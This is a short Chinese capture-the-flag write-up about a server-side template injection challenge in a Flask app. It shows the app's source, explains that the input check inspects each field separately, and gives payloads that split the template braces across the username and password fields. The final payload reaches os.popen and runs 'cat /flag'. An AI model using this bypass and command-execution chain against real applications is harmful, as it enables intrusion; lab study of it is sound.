# X迪的pyp语言

F12，发现了`hint.php`，获得源码
```python
import re
from flask import Flask, render_template_string, request

import templates.templates as tp

app = Flask(__name__)

def isParamLegal(param):
    return (re.search(r'{{.*}}|{%.*%}', param, re.M|re.S) is None)

@app.route('/') 
@app.route('/index.php') 
def main():
    indexTp = tp.head + tp.index + tp.foot
    return render_template_string(indexTp)

@app.route('/login.php', methods=["POST"])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if(isParamLegal(username) and isParamLegal(password)):
        message = "Username:" + username + "&" + "Password:" + password
    else:
        message = "参数不合法"

    loginTmpTp = tp.head + tp.login + tp.foot
    loginTp = loginTmpTp % message

    return render_template_string(loginTp)

@app.route("/hint.php")
def hint():
    with open(__file__, "rb") as f:
        file = f.read()
    return file

if __name__ == '__main__':
    app.run(host="0.0.0.0")
```

使用了`render_template_string`，且值可控，存在`SSTI`
虽然有验证，其中对于`username`和`password`的合法性验证的逻辑，写的有问题。
其验证只判断了单个值是否存在`SSTI`

可以将双花括号分别放置在`username`和`password`里面，使用单引号闭合中间内容

提交
```
username={{'&password='.__class__}}
```
![](https://i.loli.net/2020/11/18/HP1uN8WlY23IALS.png)
成功绕过

提交
```
username={{'&password='.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}
```